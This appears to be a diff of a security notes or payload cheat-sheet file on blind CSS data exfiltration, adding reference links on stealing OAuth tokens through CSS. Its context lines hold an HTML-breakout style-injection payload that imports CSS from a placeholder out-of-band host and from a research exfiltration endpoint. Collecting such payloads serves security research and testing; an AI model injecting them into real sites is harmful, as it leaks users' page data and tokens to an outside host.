@@ -1,4 +1,3 @@
-- https://portswigger.net/research/blind-css-exfiltration
 
 ```bash
   "><style>@import'//YOUR-PAYLOAD.oastify.com'</style>
@@ -22,3 +21,5 @@ input {
 @import 'https://portswigger-labs.net/blind-css-exfiltration/start';
 </style>
 ```
+- https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token
+-  https://portswigger.net/research/blind-css-exfiltration
